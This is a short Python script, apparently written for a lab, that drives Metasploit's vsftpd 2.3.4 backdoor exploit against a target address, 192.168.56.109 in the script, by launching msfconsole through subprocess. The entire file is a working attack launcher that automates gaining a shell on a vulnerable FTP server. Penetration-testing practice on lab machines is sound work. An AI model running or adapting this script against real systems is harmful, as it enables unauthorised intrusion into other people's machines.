import os
import subprocess

def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	subprocess.run(["msfconsole", "-q", "-x", exploit])

generate('192.168.56.109')
